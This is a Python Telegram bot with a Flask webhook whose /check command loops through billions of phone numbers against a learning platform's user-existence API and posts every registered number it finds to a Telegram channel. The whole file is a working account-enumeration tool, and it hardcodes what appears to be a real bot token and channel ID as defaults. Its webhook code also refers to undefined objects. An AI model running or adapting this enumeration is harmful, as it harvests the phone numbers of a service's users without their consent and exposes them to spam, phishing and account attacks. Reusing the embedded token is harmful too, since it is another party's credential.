import os
import requests
import time
import asyncio
from flask import Flask, request
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from threading import Thread

# Initialize Flask app
app = Flask(__name__)

# Your Telegram bot token and chaT
TOKEN = os.environ.get("BOT_TOKEN", "7880934596:AAGHo26aR0PjwrSyXY7xEVhC9nW95ejKVDc")
CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1002454808208")  # Your channel ID

# URL and headers for checking the user
url = "https://isaclearningapi.akamai.net.in/get/check_user_exist"
headers = {
    "Client-Service": "Appx",
    "Auth-Key": "appxapi",
    "source": "website"
}

# Function to check user existence
def check_user_exist(phone_number):
    params = {
        "email_or_phone": str(phone_number)
    }
    response = requests.get(url, headers=headers, params=params)
    if response.status_code == 200:
        response_data = response.json()
        if response_data.get("data") == True:
            return True
    return False

# Function to run the number check and send progress updates
async def check_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_numbers = 5000000000
    start_number = 5000000000
    checked_numbers = 0
    last_checked_number = None
    start_time = time.time()

    # Send initial progress message
    progress_message = await update.message.reply_text(
        text="Starting to check numbers...\n"
             f"Total numbers: {total_numbers}\n"
             f"Checked numbers: {checked_numbers}\n"
             f"Time left: Calculating...\n"
             f"Last checked number: N/A"
    )

    check_interval = 0.06  # Time to wait for the next check to ensure 1000 numbers in 1 minute

    for phone_number in range(start_number, start_number + total_numbers):
        if check_user_exist(phone_number):
            await context.bot.send_message(
                chat_id=CHANNEL_ID,
                text=f"User exists with phone number: {phone_number}"
            )

        last_checked_number = phone_number
        checked_numbers += 1
        elapsed_time = time.time() - start_time
        time_left = (total_numbers - checked_numbers) / (checked_numbers / elapsed_time)
        minutes_left = time_left // 60
        seconds_left = time_left % 60

        if checked_numbers % 100 == 0:
            await progress_message.edit_text(
                text=f"Progress:\n"
                     f"Total numbers: {total_numbers}\n"
                     f"Checked numbers: {checked_numbers}\n"
                     f"Time left: {int(minutes_left)}:{int(seconds_left)}\n"
                     f"Last checked number: {last_checked_number}"
            )

        await asyncio.sleep(check_interval)

    await progress_message.edit_text(
        text=f"Finished checking numbers.\nTotal numbers: {total_numbers}\nChecked numbers: {checked_numbers}\nLast checked number: {last_checked_number}"
    )

# Function to start the bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Bot started! Use /check to start checking numbers.")

# Main function to handle the Telegram bot
def run_bot():
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("check", check_numbers))

    application.run_polling()

# Flask route for the webhook
@app.route(f'/{TOKEN}', methods=['POST'])
def webhook():
    json_str = request.get_data().decode('UTF-8')
    update = Update.de_json(json_str, bot)
    application.update_queue.put(update)  # Make sure the bot processes updates
    return 'OK'

# Set up the Flask app and start it
def start_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

if __name__ == "__main__":
    # Run the Flask and Bot in separate threads
    thread_flask = Thread(target=start_flask)
    thread_flask.start()

    # Run the bot
    run_bot()
